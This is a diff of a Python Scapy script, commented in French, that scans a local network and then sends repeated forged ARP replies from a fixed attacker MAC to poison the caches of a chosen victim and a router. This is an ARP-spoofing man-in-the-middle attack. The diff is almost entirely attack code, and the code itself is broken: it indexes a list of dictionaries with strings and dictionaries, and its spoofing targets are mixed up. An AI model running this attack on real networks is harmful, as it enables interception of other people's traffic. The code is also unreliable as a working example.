@@ -13,22 +13,24 @@ print("\n" + "Available devices in the network :" + "\n" + "IP" + " "*18 + "MAC"
 for victime in victimes: # affiche les adresse ip et mac des appareils connectes au reseau qui sont dans le tableau victimes
     print(victime['ip'])
     print(victime['mac'] + "\n")
-    
-victime_ip = victimes['ip'][1]
-victime_mac = victimes['mac'][1]
 
 for i in victimes:
     if i['ip'] == "192.168.1.12":
-        passerelle_ip = victimes['ip'][2]
-        passerelle_mac = victimes['mac'][2]
-
+        passerelle_ip = victimes['ip'][i]
+        passerelle_mac = victimes['mac'][i]
+    if i['ip'] == "192.168.1.11":
+        victime_ip = victimes['ip'][i]
+        victime_mac = victimes['mac'][i]
+    if i['ip'] == "192.168.1.254": 
+        routeur_ip = victimes['ip'][i]       
+        routeur_mac = victimes['mac'][i]
 atk_mac = '08:00:27:c0:36:64'
 
 nb_packets = 0
 while nb_packets < 100:
     spoof_arp_victime = Ether(src=atk_mac)/ARP(op=2, pdst=victime_ip, hwdst=victime_mac, psrc=passerelle_ip)
-    spoof_arp_passerelle = Ether(src=atk_mac)/ARP(op=2, pdst=passerelle_ip, hwdst=passerelle_mac, psrc=victime_ip)
-    send_spoof1 = sendp(spoof_arp_passerelle)
+    spoof_arp_routeur = Ether(src=atk_mac)/ARP(op=2, pdst=routeur_ip, hwdst=routeur_mac, psrc=passerelle_ip)
+    send_spoof1 = sendp(spoof_arp_routeur)
     send_spoof2 = sendp(spoof_arp_victime)
     nb_packets += 2
 
